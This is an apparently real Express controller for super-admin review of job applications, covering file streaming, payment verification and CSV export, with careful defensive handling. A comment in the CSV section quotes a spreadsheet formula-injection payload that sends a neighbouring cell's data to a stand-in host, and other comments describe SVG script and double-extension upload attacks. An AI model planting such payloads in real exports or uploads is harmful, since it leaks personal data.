import path from 'node:path';
import fs from 'node:fs/promises';
import { createReadStream } from 'node:fs';
import { pipeline } from 'node:stream/promises';
import { Application } from '../../models/Application.js';
import { APPLICATION_STATUS } from '../../constants/enums.js';
import { asyncHandler } from '../../utils/asyncHandler.js';
import { ok } from '../../utils/ApiResponse.js';
import { ApiError } from '../../utils/ApiError.js';
import { parseListQuery, paginateQuery } from '../../utils/query.js';
import { audit, logActivity } from '../../services/audit.service.js';
import { setStatus as applyStatus, setPaymentStatus as applyPaymentStatus } from '../../services/application.service.js';
// Applicant files live outside the express.static mount, so the path resolver
// lives with the writer rather than being re-derived here — a second copy of the
// directory constant is a second thing to forget when it moves.
import { privateFilePath } from '../../services/file.service.js';
import { applicationPdf } from '../../services/application.pdf.js';
import { logger } from '../../config/logger.js';

/**
 * Super-admin review of public interview applications.
 *
 * Platform-level: an Application has no `company`, so nothing here scopes by
 * tenant the way controllers/company/* do — the route's rbac() is the whole gate.
 *
 * Two rules from the model shape every handler below. The applicant's payment
 * claim is never rendered as a fact (only `verified`/`waived` count, hence
 * `withIsPaid`), and their resume and photo are reachable only through `file`,
 * which is why nothing here ever emits a URL for them.
 */

/** The two file fields on the model. Also the whitelist for `:kind`. */
const FILE_KINDS = ['resume', 'photo'];

/**
 * Attach the model's `isPaid` virtual to a plain row.
 *
 * The schema doesn't opt into `toJSON: { virtuals: true }` the way QuestionSet.js
 * does, and paginateQuery hands back lean() rows besides — so `isPaid` reaches no
 * response on its own, and the one thing this module must never do is let a claim
 * read as "Paid". Hydrating to read the virtual keeps that rule where the model
 * put it rather than restating `verified || waived` here, which is the copy that
 * drifts.
 */
const withIsPaid = (row) => ({ ...row, isPaid: Application.hydrate(row).isPaid });

/**
 * The shared read query behind `list` and `exportCsv`, so the download is what
 * the admin is looking at rather than a second, subtly different filter.
 */
function listOptions(req) {
  const opts = parseListQuery(req.query, {
    // A regex OR, not the model's `application_search` text index — deliberate.
    // $text matches whole stemmed words, so "prash" would never find "Prashant"
    // and no partial email would match at all. An admin search box is prefixes.
    // `applicationId` leads because that id exists to be quoted over the phone,
    // which is exactly when someone types it in here.
    searchFields: ['applicationId', 'fullName', 'email', 'mobile', 'preferredJobRole', 'currentCompany', 'skills'],
    // Not the helper's '-createdAt': the indexes are { status: 1, submittedAt: -1 }
    // and { 'payment.status': 1, submittedAt: -1 }, and the default view is a
    // status filter over exactly those.
    defaultSort: '-submittedAt',
  });
  if (req.query.status) opts.filter.status = req.query.status;
  if (req.query.paymentStatus) opts.filter['payment.status'] = req.query.paymentStatus;
  const submittedAt = dateRange(req.query.from, req.query.to);
  if (submittedAt) opts.filter.submittedAt = submittedAt;
  return opts;
}

/** An unparseable date is a filter the admin thinks is applied. Say so. */
function parseDate(value, field) {
  const d = new Date(String(value));
  if (Number.isNaN(d.getTime())) throw ApiError.badRequest(`Invalid "${field}" date: ${value}`);
  return d;
}

/** ?from / ?to over submittedAt, both inclusive. */
function dateRange(from, to) {
  const range = {};
  if (from) range.$gte = parseDate(from, 'from');
  if (to) {
    const end = parseDate(to, 'to');
    // A bare YYYY-MM-DD parses to midnight, so "to 2026-07-15" would drop
    // everything submitted during the day the admin actually asked for.
    if (/^\d{4}-\d{2}-\d{2}$/.test(String(to))) end.setUTCHours(23, 59, 59, 999);
    range.$lte = end;
  }
  return Object.keys(range).length ? range : null;
}

/**
 * GET /admin/applications
 * Query: ?q= ?status= ?paymentStatus= ?from= ?to= ?sort= ?page= ?limit=
 */
export const list = asyncHandler(async (req, res) => {
  const opts = listOptions(req);
  // No .select('+resumeText ...') here or anywhere below: resumeText,
  // submittedIp and submittedUserAgent are select:false, so a plain find()
  // already omits them. That is the mechanism — leave it alone.
  const { items, meta } = await paginateQuery(Application, opts.filter, opts);
  return ok(res, items.map(withIsPaid), 'OK', meta);
});

/** GET /admin/applications/:id — the full record, including notes + statusHistory. */
export const getOne = asyncHandler(async (req, res) => {
  const application = await Application.findById(req.params.id)
    // `payment.verifiedBy` is the one actor reference with no denormalised name
    // beside it; notes and statusHistory carry `byName` precisely so they still
    // read correctly once the reviewer's account is gone, so they need no join.
    .populate('payment.verifiedBy', 'name email')
    .populate('convertedCandidate', 'name email')
    .lean();
  if (!application) throw ApiError.notFound('Application not found');
  return ok(res, withIsPaid(application));
});

/**
 * GET /admin/applications/:id/pdf — the formal application document.
 *
 * Behind the admin gate rather than public, for the same reason the file route
 * is: it carries the applicant's full record. Fetched as a document (not a lean
 * object) so the `isPaid` virtual is available to the renderer — the PDF must
 * print what we KNOW about the money, and a lean row silently loses the one
 * thing that distinguishes a claim from a verified payment.
 */
export const pdf = asyncHandler(async (req, res) => {
  const application = await Application.findById(req.params.id).populate('payment.verifiedBy', 'name');
  if (!application) throw ApiError.notFound('Application not found');

  const buffer = await applicationPdf(application);
  res.setHeader('Content-Type', 'application/pdf');
  res.setHeader('Content-Length', buffer.length);
  // The applicationId, not the mongo id: this file gets saved and emailed, and
  // the name is the thing a person searches for later.
  const disposition = req.query.download === '1' ? 'attachment' : 'inline';
  res.setHeader('Content-Disposition', `${disposition}; filename="${application.applicationId}.pdf"`);
  return res.send(buffer);
});

/** PATCH /admin/applications/:id/status — body { status }. */
export const setStatus = asyncHandler(async (req, res) => {
  // Checked here as well as at the route: a field the zod schema forgot is
  // stripped in silence, and `undefined` would sail past the enum (it only
  // fires on a value) and blank the status of a real application.
  if (!APPLICATION_STATUS.includes(req.body.status)) {
    throw ApiError.badRequest(`Status must be one of: ${APPLICATION_STATUS.join(', ')}`);
  }

  const application = await Application.findById(req.params.id);
  if (!application) throw ApiError.notFound('Application not found');

  const before = application.status;
  await applyStatus(application, req.body.status, req.user);

  // applyStatus is a no-op when the status didn't move — don't record a
  // transition that never happened.
  if (application.status !== before) {
    await audit({
      req,
      action: 'application.status',
      entityType: 'Application',
      entityId: application._id,
      changes: { before, after: application.status },
      meta: { applicationId: application.applicationId },
    });
  }
  return ok(res, withIsPaid(application.toObject()), 'Status updated');
});

/**
 * The payment states an admin may set.
 *
 * `unpaid` and `claimed` are missing on purpose: they are facts about what the
 * APPLICANT did — whether they pasted a reference, and when — recorded once at
 * submission. An admin setting `claimed` would be asserting a claim the
 * applicant never made; setting `unpaid` would erase one they did. What an admin
 * owns is the verdict on the claim, and that is these three.
 */
const ADMIN_PAYMENT_VERDICTS = ['verified', 'failed', 'waived'];

/** PATCH /admin/applications/:id/payment — body { status, note }. */
export const verifyPay = asyncHandler(async (req, res) => {
  const { status, note } = req.body;
  if (!ADMIN_PAYMENT_VERDICTS.includes(status)) {
    throw ApiError.badRequest(`Payment status must be one of: ${ADMIN_PAYMENT_VERDICTS.join(', ')}`);
  }

  const application = await Application.findById(req.params.id);
  if (!application) throw ApiError.notFound('Application not found');

  const before = application.payment.status;
  await applyPaymentStatus(application, { status, note }, req.user);

  // The point where one person's word becomes the platform's position on money.
  // AuditLog, not ActivityLog: it keeps the actor's role and IP and never expires.
  await audit({
    req,
    action: 'application.payment',
    entityType: 'Application',
    entityId: application._id,
    changes: { before, after: status },
    meta: { applicationId: application.applicationId, reference: application.payment.reference, note },
  });
  return ok(res, withIsPaid(application.toObject()), 'Payment updated');
});

/** POST /admin/applications/:id/notes — body { body }. */
export const addNote = asyncHandler(async (req, res) => {
  const body = String(req.body.body ?? '').trim();
  if (!body) throw ApiError.badRequest('A note cannot be empty');

  const application = await Application.findByIdAndUpdate(
    req.params.id,
    // byName is denormalised at write time — the note has to keep saying who
    // wrote it after that reviewer's account is gone.
    { $push: { notes: { body, by: req.user._id, byName: req.user.name, at: new Date() } } },
    { new: true, runValidators: true },
  );
  if (!application) throw ApiError.notFound('Application not found');
  return ok(res, application.notes, 'Note added');
});

/** DELETE /admin/applications/:id/notes/:noteId */
export const removeNote = asyncHandler(async (req, res) => {
  const application = await Application.findById(req.params.id);
  if (!application) throw ApiError.notFound('Application not found');

  const note = application.notes.id(req.params.noteId);
  // $pull reports success for a note that was never there; an admin whose
  // delete did nothing deserves to be told, not reassured.
  if (!note) throw ApiError.notFound('Note not found');
  note.deleteOne();
  await application.save();

  return ok(res, application.notes, 'Note removed');
});


/**
 * Content types we are willing to let a browser RENDER.
 *
 * `mimeType` is whatever the multipart request claimed — multer copies the
 * client's Content-Type verbatim — so this value is the applicant's to choose.
 * Echoing it back with `inline` is how a text/html "resume", or an "image" of
 * type image/svg+xml, becomes script executing on this origin with a super
 * admin's session attached. SVG is excluded for exactly that reason: it is the
 * one image type that is really a document. Anything not on this list is handed
 * over as opaque bytes to download instead of being trusted.
 */
const INLINE_SAFE = new Set(['application/pdf', 'image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/bmp', 'image/tiff']);

/**
 * Extensions we are willing to put on a download. Mirrors upload.js's
 * RESUME_EXTS, plus the image types a photo arrives as.
 *
 * A whitelist, because the extension is the applicant's too: uploadResume
 * accepts on mimetype OR extension, so a `cv.pdf.exe` sent as Content-Type
 * application/pdf passes the filter and saveBuffer stores it with the `.exe`
 * still on it. What a file is named decides what the admin's OS does when they
 * double-click it, and that is not a decision an applicant gets to make.
 */
const SAFE_EXTS = new Set(['.pdf', '.doc', '.docx', '.txt', '.png', '.jpg', '.jpeg', '.gif', '.webp', '.bmp', '.tif', '.tiff']);

/**
 * A filename we chose rather than one the applicant did.
 *
 * `originalName` is their string and this lands in a header, where a quote would
 * escape the filename parameter — and doing RFC 5987 properly for the Hindi
 * names this form invites is real machinery for no gain. The applicationId is
 * what an admin quotes anyway, and it sorts. An unrecognised extension is simply
 * dropped: better a file the admin has to open by hand than one their shell runs.
 */
function downloadName(applicationId, kind, originalName) {
  const ext = path.extname(originalName || '').toLowerCase();
  const id = String(applicationId || 'application').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
  return `${id}-${kind}${SAFE_EXTS.has(ext) ? ext : ''}`;
}

/**
 * GET /admin/applications/:id/file/:kind — kind = resume | photo. ?download=1
 * forces a save-as instead of a preview.
 *
 * The only route that reads an applicant's resume or photo, and the reason the
 * model stores no `url` for them.
 */
export const file = asyncHandler(async (req, res) => {
  const { kind } = req.params;
  if (!FILE_KINDS.includes(kind)) throw ApiError.notFound('Unknown file');

  // Project down to what streaming needs — there is no reason to pull a whole
  // application, notes and all, to answer with some bytes.
  const application = await Application.findById(req.params.id).select(`applicationId ${kind}`).lean();
  if (!application) throw ApiError.notFound('Application not found');

  const stored = application[kind];
  if (!stored?.filename) throw ApiError.notFound(`No ${kind} on file`);

  const full = privateFilePath(stored.filename);
  if (!full) {
    // Not a missing file — a stored name that points outside the upload root is
    // a corrupt or tampered record, and somebody should look at it.
    logger.error({ applicationId: application.applicationId, kind }, 'stored filename escapes the upload directory');
    throw ApiError.notFound(`No ${kind} on file`);
  }

  // One stat answers "is it there", "is it a file not a directory", and
  // Content-Length. Any failure at all — ENOENT, EACCES, a NUL in the name —
  // is the same answer to the caller.
  const stat = await fs.stat(full).catch(() => null);
  if (!stat?.isFile()) throw ApiError.notFound(`The ${kind} is missing from storage`);

  const claimed = String(stored.mimeType || '');
  const contentType = INLINE_SAFE.has(claimed) ? claimed : 'application/octet-stream';
  // Anything we won't render is a download whether or not they asked.
  const disposition = req.query.download === '1' || contentType === 'application/octet-stream' ? 'attachment' : 'inline';

  res.setHeader('Content-Type', contentType);
  res.setHeader('Content-Length', stat.size);
  res.setHeader('Content-Disposition', `${disposition}; filename="${downloadName(application.applicationId, kind, stored.originalName)}"`);
  // helmet already sends nosniff; this narrows its default CSP from 'self' to
  // nothing, so even a file that does end up rendering can't run script or
  // reach back out.
  res.setHeader('Content-Security-Policy', "default-src 'none'; sandbox");
  // A stranger's CV has no business in a shared proxy or a disk cache.
  res.setHeader('Cache-Control', 'private, no-store');

  // Who looked at an applicant's passport photo is precisely the question an
  // audit trail exists to answer.
  await audit({
    req,
    action: 'application.file.read',
    entityType: 'Application',
    entityId: req.params.id,
    meta: { kind, applicationId: application.applicationId, disposition },
  });

  // Streamed, not buffered: a resume is capped at 15 MB and there is no reason
  // for that to become 15 MB of heap per concurrent reviewer.
  await pipeline(createReadStream(full), res).catch((err) => {
    // An admin closing the preview tab rejects this after the first byte is
    // out. errorHandler doesn't check headersSent, so handing this to next()
    // would try to write a JSON error over a live response and page the on-call
    // for an ordinary click.
    logger.warn({ err: err.message, kind, applicationId: application.applicationId }, 'application file stream ended early');
  });
});

/**
 * A CSV cell, with formula injection defanged.
 *
 * Every string in this file came off a public form, and the file's whole purpose
 * is to be opened in Excel. A fullName of `=HYPERLINK("http://x/?"&A1)` is a
 * working exfiltration of the row beside it the moment an admin double-clicks
 * the download. Excel reads a leading = + - @ (and tab/CR) as the start of a
 * formula, so those get an apostrophe, which it eats on display.
 */
const csvCell = (v) => {
  let s = v == null ? '' : String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};

const isoDate = (d) => (d ? new Date(d).toISOString() : '');

/**
 * The export's columns.
 *
 * `Payment status` and `Paid` are two columns on purpose: the first is what the
 * record says, the second is the only one that means money arrived. A single
 * merged column is how a claim ends up reading as "Paid" in a spreadsheet
 * somebody then makes a decision from.
 *
 * resumeText / submittedIp / submittedUserAgent are absent because they are
 * select:false — the lean() rows below never carry them, and a CSV mailed
 * around the office is the last place a stranger's IP should surface.
 */
const EXPORT_COLUMNS = [
  ['Application ID', (r) => r.applicationId],
  ['Submitted', (r) => isoDate(r.submittedAt)],
  ['Status', (r) => r.status],
  ['Full name', (r) => r.fullName],
  ['Email', (r) => r.email],
  ['Mobile', (r) => r.mobile],
  ['City', (r) => r.city],
  ['State', (r) => r.state],
  ['Country', (r) => r.country],
  ['Preferred role', (r) => r.preferredJobRole],
  ['Language', (r) => r.preferredLanguage],
  ['Experience type', (r) => r.experienceType],
  ['Experience (yrs)', (r) => r.totalExperienceYears],
  ['Current company', (r) => r.currentCompany],
  ['Current title', (r) => r.currentJobTitle],
  ['Qualification', (r) => r.highestQualification],
  ['College', (r) => r.college],
  ['Passing year', (r) => r.passingYear],
  ['Skills', (r) => (r.skills || []).join('; ')],
  ['Expected salary', (r) => r.expectedSalary],
  ['Notice period', (r) => r.noticePeriod],
  ['Payment status', (r) => r.payment?.status],
  ['Paid', (r) => (r.isPaid ? 'Yes' : 'No')],
  ['Payment reference', (r) => r.payment?.reference],
  ['Fee', (r) => r.payment?.amount],
  ['Currency', (r) => r.payment?.currency],
  ['Payment verified at', (r) => isoDate(r.payment?.verifiedAt)],
];

/**
 * GET /admin/applications/export — CSV of whatever `list` is currently showing.
 *
 * Hand-rolled rather than services/export.service.js: every exporter there is
 * welded to one payload — reportToPdf, rankingToExcel, buildAnalyticsExport's
 * fixed metric list — and none of them takes generic rows, so there is nothing
 * to reuse. This matches the shape leads/demoBooking already use for this job.
 */
export const exportCsv = asyncHandler(async (req, res) => {
  const opts = listOptions(req);
  const rows = await Application.find(opts.filter).sort(opts.sort).limit(20000).lean();

  const header = EXPORT_COLUMNS.map(([h]) => csvCell(h)).join(',');
  const body = rows.map(withIsPaid).map((r) => EXPORT_COLUMNS.map(([, get]) => csvCell(get(r))).join(',')).join('\n');

  // A bulk read of every applicant's contact details leaving the building.
  await audit({ req, action: 'application.export', entityType: 'Application', meta: { count: rows.length, filter: req.query } });

  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="applications-${new Date().toISOString().slice(0, 10)}.csv"`);
  // A BOM, so Excel reads this as UTF-8 instead of mangling every non-ASCII name.
  return res.send(`\uFEFF${header}\n${body}`);
});

/**
 * Unlink an application's uploads. Best effort — returns what actually went.
 *
 * resolveUpload again, because a traversal that deletes is worse than one that
 * reads.
 */
async function unlinkStored(application) {
  const removed = [];
  for (const kind of FILE_KINDS) {
    const filename = application[kind]?.filename;
    const full = filename && privateFilePath(filename);
    if (!full) continue;
    try {
      await fs.unlink(full);
      removed.push(filename);
    } catch (err) {
      // ENOENT is the file already being gone, which is the goal. Anything else
      // leaves a stranger's CV on disk that nothing points at any more — the row
      // is gone either way, so say so loudly rather than fail the request.
      if (err.code !== 'ENOENT') logger.error({ err: err.message, filename, kind }, 'could not unlink an application upload');
    }
  }
  return removed;
}

/** DELETE /admin/applications/:id — hard delete, files and all. */
export const remove = asyncHandler(async (req, res) => {
  const application = await Application.findByIdAndDelete(req.params.id);
  if (!application) throw ApiError.notFound('Application not found');

  // The row is the only thing that knows these filenames, so dropping it without
  // them strands a stranger's CV and photo on disk forever — the exact outcome
  // the no-URL rule exists to prevent. After the delete, not before: a file that
  // won't unlink must not resurrect the record.
  const removedFiles = await unlinkStored(application);

  await logActivity({
    // `actor`, not `user` — logActivity destructures its argument, so a wrong key
    // is dropped in silence and the entry records that nobody did this.
    actor: req.user._id,
    // No `company`: applications belong to the platform, not a tenant.
    action: 'application.deleted',
    entityType: 'Application',
    entityId: application._id,
    summary: `Application ${application.applicationId} (${application.fullName}) deleted`,
    meta: { applicationId: application.applicationId, status: application.status, removedFiles },
  });
  // ActivityLog expires after 90 days (ActivityLog.js:24). The permanent record
  // of who destroyed a person's application — and their right-to-erasure
  // evidence — belongs in the audit trail, which is what every other admin
  // delete in this directory writes.
  await audit({
    req,
    action: 'application.delete',
    entityType: 'Application',
    entityId: req.params.id,
    meta: { applicationId: application.applicationId, status: application.status, removedFiles },
  });

  return ok(res, null, 'Application deleted');
});
